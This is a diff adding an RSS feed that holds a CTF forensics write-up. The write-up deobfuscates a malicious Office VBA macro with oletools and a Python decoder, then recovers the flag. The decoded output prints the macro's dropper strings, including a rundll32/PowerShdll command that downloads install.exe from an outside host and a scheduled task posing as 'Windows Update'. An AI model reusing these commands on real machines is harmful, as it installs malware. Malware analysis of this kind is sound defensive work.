@@ -1,0 +1,205 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>VBA on Hacklagr0y</title>
+    <link>https://alagroy-42.github.io/tags/vba/</link>
+    <description>Recent content in VBA on Hacklagr0y</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 14 Jun 2022 18:39:26 +0200</lastBuildDate><atom:link href="https://alagroy-42.github.io/tags/vba/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>New Era - [HTB UNICTF 2021 - Finals]</title>
+      <link>https://alagroy-42.github.io/writeups/new_era/</link>
+      <pubDate>Tue, 14 Jun 2022 18:39:26 +0200</pubDate>
+      
+      <guid>https://alagroy-42.github.io/writeups/new_era/</guid>
+      <description>The Challenge For this challenge we had an ISO file that contains this Office document.
+We are gonna use the oletool suite to try to see if there is anything suspicious in that file.
+The oledump utility shows us that there are macros that appear suspicious. We are gonna use the olevba utility to get more infos on the macros
+That definitely looks odd. Nonetheless, when we try to decode the base64 strings, it looks like non-sense so we are gonna try to look at the macro code.</description>
+      <content>&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;
+&lt;p&gt;For this challenge we had an ISO file that contains &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/office.doc&#34;&gt;this Office document&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We are gonna use the &lt;code&gt;oletool&lt;/code&gt; suite to try to see if there is anything suspicious in that file.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/new_era_oledump.png&#34; alt=&#34;oledump&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;oledump&lt;/code&gt; utility shows us that there are macros that appear suspicious.
+We are gonna use the &lt;code&gt;olevba&lt;/code&gt; utility to get more infos on the macros&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/new_era_olevba.png&#34; alt=&#34;olevba&#34;&gt;&lt;/p&gt;
+&lt;p&gt;That definitely looks odd. Nonetheless, when we try to decode the base64 strings, it looks like non-sense so we are gonna try to look at the macro code. The problem is that it&amp;rsquo;s been compiled into assembly so we don&amp;rsquo;t have a direct access to the VBA. We are gonna use a utility called &lt;code&gt;pcode2code&lt;/code&gt; to transform back the pcode into human-readable VBA which gives us &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/raw_macro.vba&#34;&gt;this file&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Good news is that this is human readable-code, bad news is that it is completely obfuscated. So our main task will be to deobfuscate it.
+We can notice a lot of code chunks using the &lt;code&gt;Chr&lt;/code&gt; function that converts a number to a char so we can guess that those are hidden strings. By simply copying those in a python file and renaming &lt;code&gt;Chr&lt;/code&gt; to &lt;code&gt;chr&lt;/code&gt; plus a few minor modifications, we can retrieve them and replace them in the original code.
+For example :
+&lt;code&gt;td.RegistrationInfo.Author = SazX46jj(&amp;quot;m&amp;quot; &amp;amp; Chr(int(&amp;quot;&amp;amp;H4f&amp;quot;)) &amp;amp; Chr(-878 + 958) &amp;amp; Chr(&amp;amp;H32) &amp;amp; &amp;quot;U&amp;quot; &amp;amp; Chr(75) &amp;amp; Chr(-2899 + 3012) &amp;amp; Chr(int(&amp;quot;55&amp;quot;)) &amp;amp; Chr(int(&amp;quot;47&amp;quot;)) &amp;amp; Chr(2158 - 2109) &amp;amp; Chr(int(&amp;quot;&amp;amp;H52&amp;quot;)) &amp;amp; Chr(1501 - 1390) &amp;amp; Chr(int(&amp;quot;112&amp;quot;)) &amp;amp; Chr(476 - 360) &amp;amp; Chr(-1634 + 1716) &amp;amp; Chr(int(&amp;quot;71&amp;quot;)) &amp;amp; Chr(113) &amp;amp; Chr(&amp;amp;H76) &amp;amp; Chr(int(&amp;quot;106&amp;quot;)) &amp;amp; Chr(99) &amp;amp; Chr(int(&amp;quot;&amp;amp;H55&amp;quot;)) &amp;amp; Chr(int(&amp;quot;&amp;amp;H75&amp;quot;)) &amp;amp; Chr(int(&amp;quot;&amp;amp;H43&amp;quot;)) &amp;amp; Chr(&amp;amp;H30) &amp;amp; Chr(47) &amp;amp; Chr(int(&amp;quot;&amp;amp;H46&amp;quot;)) &amp;amp; Chr(88) &amp;amp; Chr(8301 - 8247) &amp;amp; Chr(&amp;amp;H2B) &amp;amp; Chr(int(&amp;quot;108&amp;quot;)) &amp;amp; &amp;quot;9&amp;quot; &amp;amp; Chr(&amp;amp;H64))&lt;/code&gt;
+will now be :
+&lt;code&gt;td.RegistrationInfo.Author = deobf_str(&amp;quot;mOP2UKq7/1RoptRGqvjcUuC0/FX6+l9d&amp;quot;)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Every encoded string seems to be another base64 string but they also don&amp;rsquo;t decode into anything readable. However, we can notice that each of the base64-like strings are given to the same function that we will name &lt;code&gt;deobf_str&lt;/code&gt;. That gives us the &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/stage_1.vba&#34;&gt;stage_1&lt;/a&gt; file that is partially decoded.
+After trying to understand how the script works, we got the &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/stage_2.vba&#34;&gt;stage_2&lt;/a&gt; file that has its symbols renamed with a coherent name and also more coherent types.&lt;/p&gt;
+&lt;p&gt;Now that we have an approximation of what the &lt;code&gt;deobf_str&lt;/code&gt; function does, we will recode it in Python and try to get see what is hidden in the Base64-like strings.
+Here is the corresponding script :&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;1&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;deobfuscate.py&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
+from curses.ascii import isdigit, islower, isupper
+import sys
+
+def binary_transform1(elem, op):
+    out = elem
+    if op &amp;gt; 0:
+        if elem &amp;gt; 0:
+            out = int(out / (2 ** op))
+        else:
+            if op &amp;gt; 31:
+                out = 0
+            else:
+                out = out &amp;amp; 0x7FFFFFFF
+                out = int(out / (2 ** op))
+                out = out | (2 ** (31 - op))
+    return out
+
+def binary_transform2(elem, op):
+    out = elem
+    if op &amp;gt; 0:
+        for i in range(op):
+            m = out &amp;amp; 0x40000000
+            out = (out &amp;amp; 0x3FFFFFFF) * 2
+            if m != 0:
+                out = out | 0x80000000
+    return out
+
+def binary_transform3(setup):
+    d1 = 7
+    d2 = 14
+    t = ((setup ^ binary_transform1(setup, d2)) &amp;amp; 52428)
+    u = setup ^ t ^ binary_transform2(t, d2)
+    t = (u ^ binary_transform1(u, d1)) &amp;amp; 5570645
+    out = (u ^ t ^ binary_transform2(t, d1))
+    return out
+
+def crypto_style_mega_binary_transform(pre_final_result):
+    return_value = &amp;#34;&amp;#34;
+    for i in range(len(pre_final_result)):
+        fr = i * 4
+        if fr &amp;#43; 3&amp;gt;= len(pre_final_result):
+            break
+        setup = 0
+        setup = setup | binary_transform2(pre_final_result[fr &amp;#43; 3], 24)
+        setup = setup | binary_transform2(pre_final_result[fr &amp;#43; 2], 16)
+        setup = setup | binary_transform2(pre_final_result[fr &amp;#43; 1], 8)
+        setup |= pre_final_result[fr]
+        raw = binary_transform3(setup)
+        a = chr(binary_transform1(raw &amp;amp; 0xff000000, 24))
+        B = chr(binary_transform1(raw &amp;amp; 16711680, 16))
+        c = chr(binary_transform1(raw &amp;amp; 65280, 8))
+        d = chr(binary_transform1(raw &amp;amp; 255, 0))
+        return_value = return_value &amp;#43; d &amp;#43; c &amp;#43; B &amp;#43; a
+    return return_value
+
+
+
+matrix = [0] * 256
+arr1 = [0] * 64
+arr2 = [0] * 64
+arr3 = [0] * 64
+
+for i in range (256):
+    if isupper(i):
+        matrix[i] = i - 65
+    elif islower(i):
+        matrix[i] = i - 71
+    elif isdigit(i):
+        matrix[i] = i &amp;#43; 4
+    elif i == ord(&amp;#34;&amp;#43;&amp;#34;):
+        matrix[i] = ord(&amp;#34;&amp;gt;&amp;#34;)
+    elif i == ord(&amp;#34;/&amp;#34;):
+        matrix[i] = ord(&amp;#34;?&amp;#34;)
+
+for i in range(64):
+    arr1[i] = i * 64
+    arr2[i] = i * 64 * 64
+    arr3[i] = i * 64 * 64 * 64
+
+arg_str = sys.argv[1]
+pre_final_result = [0] * (int((len(arg_str) &amp;#43; 1) / 4) * 3)
+index_pre_final_result = 0
+
+arg_str_array = [ord(i) for i in arg_str]
+
+for iter in range(0, len(arg_str_array), 4):
+    mega_byte = arr3[matrix[arg_str_array[iter]]] &amp;#43; arr2[matrix[arg_str_array[iter &amp;#43; 1]]] &amp;#43; arr1[matrix[arg_str_array[iter &amp;#43; 2]]] &amp;#43; matrix[arg_str_array[iter &amp;#43; 3]]
+    i = mega_byte &amp;amp; 0xff0000
+    pre_final_result[index_pre_final_result] = int(i / 0x10000)
+    i = mega_byte &amp;amp; 0xff00
+    pre_final_result[index_pre_final_result &amp;#43; 1] = int(i / 0x100)
+    pre_final_result[index_pre_final_result &amp;#43; 2] = mega_byte &amp;amp; 0xff
+    index_pre_final_result &amp;#43;= 3
+
+deobf_str = crypto_style_mega_binary_transform(pre_final_result).strip(&amp;#34;~&amp;#34;)
+print(deobf_str)
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;We will give each string to that script and try to see what they are corresponding to :&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;2&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;strs.sh&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;oPhSWfo8/Qbyq3BYqC59Urpr&amp;#43;lGyyHEfqt7uVGiy8VjwrlwV6q3UHqjj8lyoOvlUuCreUfho&amp;#43;1GqWpxDsK7wUappuFOi&amp;#43;/dR0qhwVvCqU0U=&amp;#34;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;Evw9TPCsd1Ui/z1aoL1zXuhzM0yquVhXuGLWGaKHWl342F1d&amp;#34;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;iP7eVuiy8VjwqlwV8KpYFeCj/lTwRFVBuMlMVPKv8xSK4zRToL/wXOI0cBegu/VSsMhQXOg1XR7ik/9VuO/VWbivUlygvnBS6KNUH/Kt/RW44PNd8Kh8FbC68BCwy&amp;#43;Ndkq9YVPjYXV0=&amp;#34;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;Evg5SLrp1VMwrXBRIO9cXvCsd1Viv3laor9TWLguWlXo6V5f&amp;#34;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;ooz2QrAlVxVqoWBQEKSoUGDjwFAApaFQALXEVgClqVAK5SBWAKWoUWjzdVEAralRYOHkUACloVko90RQAKygUWqhVVWAJClZIOPAEBCsqFBo8XVRgCQpWUjzZlCAJClZAPX3VwCkoFEqoURUAKWpUKKK&amp;#43;AjSNlJT&amp;#43;HL8XA==&amp;#34;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;gqV5VqC/WFWi28dQuqfQVg==&amp;#34;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;mOP2UKq7/1RoptRGqvjcUuC0/FX6&amp;#43;l9d&amp;#34;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;au1hUSCmzFVAtcFSGOhzGwD110Z4/llQ6vj1QKKhTV04&amp;#43;lEQKORgEaBmzV3Y4uZQeqx9VYD2f0hY&amp;#43;FdSAPzfRsjr51nyJHFZ&amp;#34;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;qlBUCugWcgwi2FUKulBVCupQV04=&amp;#34;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;uK/UVug&amp;#43;OVDY&amp;#43;l1d&amp;#34;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;Evg5SLrp1VMwrXBRIO9cXvCsd1Viv3laor9TWLguWlXo6V5f&amp;#34;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;mqt4Vqqz8xmAvnBS6OtcXw==&amp;#34;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;&amp;#43;q94VrLvdFlymE4fyL7fVvi2wFPocndd&amp;#34;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;&amp;#43;q94VrLvdFlymE4fyL7fVvi2wFPocndd&amp;#34;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;&amp;#43;q94VrLvdFlymE4fyL7fVvi2wFPocncZmu98EjLRRVui7/dQ&amp;#43;vh9Xw==&amp;#34;
+/usr/local/bin/python3 deobfuscate.py &amp;#34;ivPlUuC4dhzSqPBW&amp;#43;PpfXQ==&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;➜  forensics_newera sh strs
+https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x64/Release/PowerShdll.dl
+C:\Windows\System32\rundll32.exe 
+\powershdll.dll,main . { Invoke-WebRequest -useb https://windowsliveupdater.com/install.exe -OutFile 
+C:\ProgramData\windows\install.exe
+; echo &amp;#39;cABhAHIAdAAxACAAPQAgACIASABUAEIAewBzAGMAaAAzAGQAdQBsADEAbgBnAF8AdAA0AHMAawBzAF8AMQBzAF8AYwAwADAAbABfACIA&amp;#39; } ^| iex;
+Schedule.Service
+Microsoft Corporation
+cGFydDIgPSAiYnV0X3AwdzNyc2gzbGxfdzF0aDB1dF9wMHczcnNoM2xsXzFzX2MwMGwzcn0i
+2022-02-22T22:22:22
+tigger.ID
+C:\ProgramData\windows\install.exe
+Windows Update
+winmgmts:\\.\root\cimv2
+winmgmts:\\.\root\cimv2
+winmgmts:\\.\root\cimv2:Win32_Process
+WScript.Shell
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That definetly looks like a shady macro and there is a particularly peculiar string in those which is&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;; echo &amp;#39;cABhAHIAdAAxACAAPQAgACIASABUAEIAewBzAGMAaAAzAGQAdQBsADEAbgBnAF8AdAA0AHMAawBzAF8AMQBzAF8AYwAwADAAbABfACIA&amp;#39; } ^| iex;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once decoded, the base64 string gives us &lt;code&gt;part1 = &amp;quot;HTB{sch3dul1ng_t4sks_1s_c00l_&amp;quot;&lt;/code&gt;. We guess that the second part is in the other base64 string which gives us, once decoded : &lt;code&gt;part2 = &amp;quot;but_p0w3rsh3ll_w1th0ut_p0w3rsh3ll_1s_c00l3r}&amp;quot;&lt;/code&gt;. We now have the full flag.&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
